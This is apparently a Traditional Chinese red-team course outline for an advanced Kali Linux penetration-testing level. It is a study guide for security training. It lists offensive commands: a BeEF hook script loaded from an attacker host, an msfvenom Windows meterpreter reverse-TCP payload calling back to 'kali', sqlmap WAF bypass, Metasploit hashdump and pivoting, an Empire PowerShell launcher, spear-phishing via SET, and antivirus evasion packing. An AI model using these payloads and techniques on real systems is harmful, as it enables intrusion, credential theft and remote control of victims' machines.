---
title: 道德黑客紅隊 - C級：高級整合與 Kali 爐火純青
slug: ethical-hacking-red-team-level-c
category: deepweay-me/ethical-hacking
tags: [紅隊, metasploit, beef, set, empire, kali-advanced, pentest]
lang: zh-TW
created: 2026-02-12
source: kilo-code-distilled
vector_ready: true
embedding_model: BAAI/bge-m3
level: C
team: red
prereq: level-b
---

# 1. 紅隊 C級概述
## 1.1 C級定位
1.11 高級階段：全鏈路 pentest workflow，工具整合，自定義腳本，Kali 生態熟練（無實際 exploit deploy，僅 POC）。
1.12 範圍：從 recon 到 initial access POC，遵守 zero-harm 原則。
1.13 標準：CREST/OSSTMM，MITRE ATT&CK 全覆蓋。

## 1.2 Kali 進階配置
1.21 Custom repo：/etc/apt/sources.list 添加 contrib non-free。
1.22 工具全家桶：`apt install beef-xss set empire burpsuite metasploit-framework -y`。
1.23 Persistence：custom /usr/share/metasploit-framework/modules 腳本。

## 1.3 進階枚舉與 Bypass
1.31 WAF Bypass：`sqlmap -u target --tamper=space2comment`。
1.32 Browser Exploitation：BeEF `beef-xss`，hook script：
```
<script src="http://kali:3000/hook.js"></script>
```
1.33 Social Engineering：SET (Social-Engineer Toolkit) `setoolkit` 選擇 1) Spear-Phishing。

## 1.4 Metasploit 進階 Workflow
1.41 Pivot：`use post/multi/manage/autoroute`，`sessions -i 1` shell。
1.42 Custom Module：ruby 開發，`msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali LPORT=4444 -f exe > poc.exe`。
1.43 Evasion：veil-evasion 或 shellter 包裝（lab only）。

## 1.5 Post-Exploitation POC (理論)
1.51 Empire/Starkiller：PowerShell C2 `usemodule powershell/launcher`。
1.52 Lateral Movement：`run post/windows/gather/hashdump`。
1.53 注意：僅 POC，立即清理。

## 1.6 自動化與腳本
1.61 Recon-ng：`marketplace install all; modules load recon/domains-hosts/shodan_hostname`。
1.62 Custom Bash：偵察一鍵腳本整合 nmap/gobuster/nikto。

## 1.7 真實案例與報告
1.71 Capital One 2019：misconfig S3 bucket，C級枚舉關鍵（AWS report）。
1.72 報告：使用 KeepNote 或 CherryTree，包含 risk rating (CVSS v4)。

# 2. Kali 爐火純青里程碑
## 2.1 熟練指標
2.11 20+ 機器 root in HTB，custom tool 開發。
## 2.2 資源
2.21 OffSec PWK, SANS SEC560, Kali Training docs。

**C級總結**：Kali 如臂使指，獨立紅隊演練。預計 100+ 小時，達 pentest 工程師水平。不探討非法滲透。